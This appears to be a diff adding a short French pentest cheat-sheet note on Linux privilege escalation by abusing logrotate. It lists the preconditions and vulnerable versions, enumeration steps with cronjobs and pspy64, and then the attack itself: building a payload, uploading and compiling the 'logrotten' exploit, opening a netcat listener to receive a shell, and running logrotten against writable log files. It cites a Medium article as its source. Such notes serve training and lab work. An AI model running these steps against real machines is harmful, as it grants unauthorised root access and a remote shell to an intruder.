@@ -1,0 +1,17 @@
+##Log Rotation exploitation
+-->Checker les droits d'écriture des fichiers de log
+
+Conditions pour que l'exploit soit possible:
+	1) Logrotate doit être executé par un user privilégié
+	2) Le user doit pouvoir ecrire dans les fichiers logs
+	3) Versions vulnérables: 3.8.6 3.11.0 3.15.0
+1 --> lister les cronjobs OU pspy64 
+2 --> trouver des fichiers logs (ex: access.log dans backups ;) )
+3 --> logrotate --version 
+
+Créer un payload
+uploader "logrotten" et compiler 
+lancer nc -lnvp <PORT>
+./logrotten -p <payload> <chemin_writable_logs>
+
+source: https://medium.com/r3d-buck3t/linux-privesc-with-logrotate-utility-219b3aa7476b
